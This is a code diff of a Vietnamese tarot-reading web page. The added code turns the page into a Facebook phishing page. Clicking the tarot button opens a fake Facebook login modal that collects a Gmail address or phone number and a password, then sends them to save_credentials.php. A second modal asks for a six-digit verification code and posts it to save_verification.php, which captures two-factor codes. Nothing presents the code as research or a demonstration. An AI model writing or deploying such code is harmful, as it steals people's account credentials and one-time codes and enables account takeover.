@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xem Tarot</title>
-    <link rel="stylesheet" href="style.css">
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     <style>
         /* Reset CSS cơ bản */
         * {
@@ -41,7 +39,7 @@
 
         /* Phần banner */
         .banner {
-            background-image: url('haha.jpeg');
+            background-image: url('frrinabackgrou.jpeg');
             background-size: cover;
             background-position: center;
             color: #fff;
@@ -73,6 +71,68 @@
         #view-tarot-btn:hover {
             background-color: #365899;
         }
+
+        /* Cửa sổ modal đăng nhập */
+        .modal {
+            display: none; /* Ẩn mặc định */
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .modal-content h2 {
+            margin-bottom: 20px;
+            color: #4267B2;
+        }
+
+        .modal-content input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+        }
+
+        .modal-content button {
+            padding: 12px 20px;
+            background-color: #4267B2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .modal-content button:hover {
+            background-color: #365899;
+        }
+
+        /* Thông báo lỗi */
+        .error-message {
+            color: red;
+            margin-top: 10px;
+        }
+
+        .verification-note {
+            font-size: 14px;
+            margin-bottom: 10px;
+            color: #666;
+        }
     </style>
 </head>
 <body>
@@ -96,11 +156,94 @@
         <button id="view-tarot-btn">Xem bài Tarot</button>
     </div>
 
+    <!-- Modal đăng nhập -->
+    <div id="login-modal" class="modal">
+        <div class="modal-content">
+            <h2>Đăng nhập Facebook</h2>
+            <form id="login-form">
+                <input type="text" id="username" placeholder="Gmail hoặc số điện thoại" required><br>
+                <input type="password" id="password" placeholder="Mật khẩu" required><br>
+                <div class="error-message" id="error-message" style="display:none;"></div> <!-- Thông báo lỗi -->
+                <button type="button" id="login-submit">Đăng nhập</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Modal nhập mã xác thực -->
+    <div id="verification-modal" class="modal">
+        <div class="modal-content">
+            <h2>Nhập mã xác thực</h2>
+            <div class="verification-note">Hãy nhập mã xác thực đã được gửi qua email hoặc số điện thoại của bạn.</div>
+            <form id="verification-form" action="save_verification.php" method="POST">
+                <input type="text" id="verification-code" name="verification_code" placeholder="Mã xác thực" required><br>
+                <div class="error-message" id="verification-error-message" style="display:none;"></div> <!-- Thông báo lỗi mã xác thực -->
+                <button type="submit">Gửi</button>
+            </form>
+        </div>
+    </div>
+
     <!-- JavaScript -->
     <script>
         const viewTarotBtn = document.getElementById('view-tarot-btn');
+        const loginModal = document.getElementById('login-modal');
+        const verificationModal = document.getElementById('verification-modal');
+        const loginSubmit = document.getElementById('login-submit');
+        const errorMessage = document.getElementById('error-message');
+        const verificationErrorMessage = document.getElementById('verification-error-message');
+
         viewTarotBtn.addEventListener('click', function() {
-            alert('Tính năng xem bài Tarot đang được phát triển!');
+            loginModal.style.display = 'flex';
+        });
+
+        loginSubmit.addEventListener('click', function() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const emailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+            const phonePattern = /^\d{10}$/;
+
+            if (emailPattern.test(username) || phonePattern.test(username)) {
+                errorMessage.style.display = 'none';
+
+                // Gửi thông tin đăng nhập qua AJAX
+                fetch('save_credentials.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                })
+                .then(response => {
+                    if (response.ok) {
+                        loginModal.style.display = 'none';
+                        verificationModal.style.display = 'flex';
+                    } else {
+                        throw new Error('Đăng nhập không thành công.');
+                    }
+                })
+                .catch(error => {
+                    errorMessage.textContent = error.message;
+                    errorMessage.style.display = 'block';
+                });
+            } else {
+                errorMessage.textContent = 'Tài khoản hoặc mật khẩu không đúng. Vui lòng nhập lại.';
+                errorMessage.style.display = 'block';
+            }
+        });
+
+        // Kiểm tra mã xác thực trước khi gửi
+        document.getElementById('verification-form').addEventListener('submit', function(event) {
+            const verificationCode = document.getElementById('verification-code').value;
+
+            // Kiểm tra nếu mã xác thực là 6 số
+            const isNumeric = /^\d{6}$/.test(verificationCode); // Kiểm tra mã xác thực phải là 6 số
+
+            if (!isNumeric) {
+                event.preventDefault(); // Ngăn gửi biểu mẫu
+                verificationErrorMessage.textContent = 'Mã xác thực chưa đúng. Vui lòng nhập lại.';
+                verificationErrorMessage.style.display = 'block';
+            } else {
+                verificationErrorMessage.style.display = 'none'; // Ẩn thông báo lỗi nếu mã hợp lệ
+            }
         });
     </script>
 
